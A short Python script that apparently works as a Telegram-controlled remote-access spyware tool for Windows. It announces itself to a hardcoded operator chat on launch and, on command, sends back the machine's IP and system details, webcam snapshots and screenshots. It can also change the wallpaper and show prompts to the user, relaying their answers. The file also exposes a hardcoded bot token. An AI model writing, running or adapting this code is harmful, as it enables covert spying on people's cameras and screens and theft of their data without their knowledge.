import telebot
from telebot import types
import pyautogui
import cv2
import ctypes
import requests
import platform
import os

TOKEN = '5599872595:AAF6GZ7vzvTj6to5RO0zFuM37Y54hB-hEzs'
CHAT_ID = '1158017810'
bot = telebot.TeleBot(TOKEN)

requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Online')


@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, f'Привет, {message.from_user.first_name}')
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    item1 = types.KeyboardButton('/ip')
    item2 = types.KeyboardButton('/spec')
    item3 = types.KeyboardButton('/webcam')
    item4 = types.KeyboardButton('/wallpaper')
    item5 = types.KeyboardButton('/screenshot')
    item6 = types.KeyboardButton('/message')
    item7 = types.KeyboardButton('/input')
    markup.add(item1, item2, item3, item4, item5, item6, item7)
    bot.send_message(message.chat.id, '<b>Мои функции</b>', parse_mode='html', reply_markup=markup)


@bot.message_handler(commands=['ip'])
def ip(message):
    response = requests.get('https://jsonip.com/').json()
    bot.send_message(message.chat.id, f'IP address: {response["ip"]}')


@bot.message_handler(commands=['spec'])
def spec(msg):
    msg1 = f"Name PC: {platform.node()}\nSystem: {platform.system()} {platform.release()}\nProcessor: {platform.processor()}"
    bot.send_message(msg.chat.id, msg1)


@bot.message_handler(commands=['webcam'])
def webcam(message):
    cap = cv2.VideoCapture(0)
    for i in range(100):
        cap.read()

    ret, frame = cap.read()

    cv2.imwrite('cam.jpg', frame)
    cap.release()
    with open('cam.jpg', 'rb') as img:
        bot.send_photo(message.chat.id, img)


@bot.message_handler(commands=['wallpaper'])
def wallpaper(msg):
    msg1 = bot.send_message(msg.chat.id, 'Пришлите фотографию которую хотите поставить на рабочий стол')
    bot.register_next_step_handler(msg1, next_wp)


@bot.message_handler(commands=['screenshot'])
def screenshot(msg):
    pyautogui.screenshot('screenshot.png')

    with open('screenshot.png', 'rb') as ggg:
        bot.send_photo(msg.chat.id, ggg, 'Ваш скрин экрана')


@bot.message_handler(commands=['message'])
def msg_sending(msg):
    msg1 = bot.send_message(msg.chat.id, 'Введите сообщение которое хотите вывести')
    bot.register_next_step_handler(msg1, nms)


def nms(msg):
    try:
        pyautogui.alert(msg.text, '777')
    except Exception:
        bot.send_message(msg.chat.id, 'Что-то пошло не так')


@bot.message_handler(commands=['input'])
def msg_sending(msg):
    msg1 = bot.send_message(msg.chat.id, 'Введите сообщение которое хотите вывести')
    bot.register_next_step_handler(msg1, nmswi)


def nmswi(msg):
    try:
        answer = pyautogui.prompt(msg.text, '777')
        bot.send_message(msg.chat.id, answer)
    except Exception:
        bot.send_message(msg.chat.id, 'Что-то пошло не так')


@bot.message_handler(content_types=['photo'])
def next_wp(msg):
    try:
        file = msg.photo[-1].file_id
        file = bot.get_file(file)
        dfile = bot.download_file(file.file_path)

        with open('image.jpg', 'wb') as img:
            img.write(dfile)

        path = os.path.abspath('image.jpg')
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
        bot.send_message(msg.chat.id, 'Я поменял обои')
    except TypeError:
        bot.send_message(msg.chat.id, 'Пришлите мне фотографию для того чтобы поменять обои')


bot.polling(none_stop=True, interval=0)
